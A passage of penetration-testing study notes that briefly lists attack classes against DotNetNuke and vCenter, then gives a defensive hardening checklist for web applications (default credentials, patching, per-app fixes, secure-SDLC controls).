| DotNetNuke (DNN) | auth bypass, dir traversal, file upload/download |
| vCenter | weak creds, Struts2 RCE, OVA upload, Win appliance privesc |

> The through-line of this whole module: **default creds + a built-in "execute/upload" feature = RCE**, on almost every app. Check creds and CVEs first, every time.

### Application Hardening (remediation reference)
Defensive side of this whole module — reuse these for the remediation section of reports (module 27).

**The big levers (fix these first):**
- **Default creds** — change/disable every default admin account; this is the #1 risk across the module.
- **Limit internet exposure** — minimize externally reachable apps; restrict login/admin pages by IP.
- **Patch promptly** — most module CVEs are version-specific; keep apps + dependencies current.
- **Least privilege** everywhere; strong passwords + MFA.

**General controls:** strict access control + file/folder perms; disable code-exec features (e.g. WP PHP editing); WAF + security monitoring; regular off-box backups; AD/LDAP SSO for central auth/audit.

**App-specific quick fixes:**
| App | Harden |
|---|---|
| WordPress | security plugin (Wordfence); disable file editor |
| Joomla | secret-key admin login (AdminExile) |
| Drupal | hide/move the admin login |
| Tomcat | Manager/Host-Manager to localhost + IP whitelist |
| Jenkins | Matrix Authorization Strategy; lock the script console |
| Splunk / PRTG | change default password; keep updated |
| osTicket | limit internet access |
| GitLab | sign-up + domain restrictions; enforce 2FA |

**Defensive domains (secure-SDLC checklist):**
- **Config mgmt:** no plaintext secrets; env vars; access-controlled config files; IaC under version control + review
- **Input/output:** validate (whitelist) all input; context-aware output encoding (XSS)
- **Sessions:** strong random IDs, timeouts, HSTS, `Secure` + `HttpOnly` cookies
- **Errors/logging:** no sensitive data in errors; custom error pages; comprehensive, protected security logs + monitoring
- **Dependencies:** SCA for third-party libs; trusted supply chain
- **Database:** least privilege, parameterized queries/stored procs, encryption at rest + in transit
- **Network:** strict firewall rules, IDS/IPS, segmentation to isolate sensitive apps
- **People/process:** secure-coding + user training; tested incident-response plan; regular assessments + pentests

> Mirror image of the attacks in this module: I broke in via default creds + exposed admin + a built-in exec feature + an unpatched CVE, so hardening closes exactly those. That symmetry is what makes a report finding actionable — every "how I got in" maps to a "here's the fix".
